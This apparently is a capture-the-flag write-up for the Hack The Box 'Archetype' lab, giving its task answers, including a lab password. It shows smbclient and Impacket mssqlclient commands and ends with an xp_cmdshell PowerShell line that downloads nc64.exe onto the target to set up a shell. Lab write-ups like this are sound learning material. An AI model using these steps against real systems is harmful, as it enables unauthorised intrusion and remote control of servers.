<h1>Archetype</h1>

<h2>CONNECT</h2>
Connect to Starting Point VPN before starting the machine<br>
Using <code>openvpn</code> to operate the file of <code>download vpn</code> in kali.

<h2>TASK</h2>

<h3>TASK 1</h3>
Q：Which TCP port is hosting a database server?<br>
A：<code>1433</code><br><br>
<img src="https://i.imgur.com/yv7T521.png" alt="nmap" width="60%">

<h3>TASK 2</h3>
Q：What is the name of the non-Administrative share available over SMB?<br>
A：<code>backups</code><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/smbclient.png" alt="smbclients" width="60%">


<h3>TASK 3</h3>
Q：What is the password identified in the file on the SMB share?<br>
A：<code>M3g4c0rp123</code><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/password.png" alt="password" width="60%">

<h3>TASK 4</h3>
Q：What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?<br>
A：<code>mssqlclient.py</code><br>
FYI：<a href="https://www.secureauth.com/labs/open-source-tools/impacket/">Secure Auth</a>

<h3>TASK 5</h3>
Q：What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?<br>
A：<code>xp_cmdshell</code><br>
FYI：<a href="1433 - Pentesting MSSQL - Microsoft SQL Server">1433 - Microsoft SQL Server</a><br>
FYI：<a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">MSSQL Injection Cheat Sheet</a><br>

<h3>TASK 6</h3>
Q：What script can be used in order to search possible paths to escalate privileges on Windows hosts?<br>
A：<code>WinPEAS</code><br>
FYI：<a href="https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md">Windows Privilege Escalation Awesome Script (.exe)</a>

<h3>TASK 7</h3>
Q：What file contains the administrator's password?<br>
A：<code>ConsoleHost_history.txt</code><br>

<h2>SUBMIT FLAG</h2>
See two important ports are 445 port and 1433 port.<br>
<img src="https://i.imgur.com/yv7T521.png" alt="nmap" width="60%">
Using smbclient to browse shared folders.<br>
<b>cmd</b>：<code>smbclient -L &lt;target_ip&gt;</code><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/smbclient.png" alt="smbclient" width="60%">

There are many similarities with ftp commands in smbclient, such as: cd, ls, get, put...<br>
You can also use <code>help</code> to view commands.<br><br>
Once in the backups folder, use <code>ls</code> to view the current directory.<br>
Using <code>get</code> command to download the <code>prod.dtsConfig</code>.<br>
<b>cmd</b>：<code>smbclient -N //&lt;target_ip&gt;/backups</code><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/smbclient3.png" alt="smbclient3" width="60%">

<code>cat</code> the data in <code>prod.dtsConfig</code>, it can be found that the password of the user sql_svc is <code>M3g4c0rp123</code>, and the host is <code>ARCHETYPE</code>.<br>
The information provided in prog.dtsConfig allows us to connect and successfully authenticate into the <code>MSSQL server</code>.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/password.png" alt="password" width="60%">

There are many python scripts in <a href="https://github.com/fortra/impacket">Impacket</a> for us to use, and what will be used here is <a href="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/mssqlclient.py> mssqlclient.py</a>.
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/mssqlclient.png" alt="mssqlclient" width="60%">

<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/MSSQLauth.png" alt="MSSQLauth" width="60%">

<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/SQLhelp.png" alt="SQLhelp" width="60%">

<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/SQLrole.png" alt="SQLrole" width="60%">

<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/netuser.png" alt="netuser" width="60%">

<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/SQLconfigure.png" alt="SQLconfigure" width="60%">

<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/SQLcondigure2.png" alt="SQLcondigure2" width="60%">

<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/SQLwhoami.png" alt="SQLwhoami" width="60%">

<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/nc.png" alt="nc" width="60%">

<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/httpserver.png" alt="httpserver" width="60%">

<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/userflag.png" alt="userflag" width="40%">


<code>python3 mssqlclient.py ARCHETYPE/sql_svc:&lt;passwd&gt;@&lt;TARGET IP&gt; -windows-auth</code><br><br>

<code>xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://&lt;TARGET IP&gt/nc64.exe -outfile nc64.exe"</code>
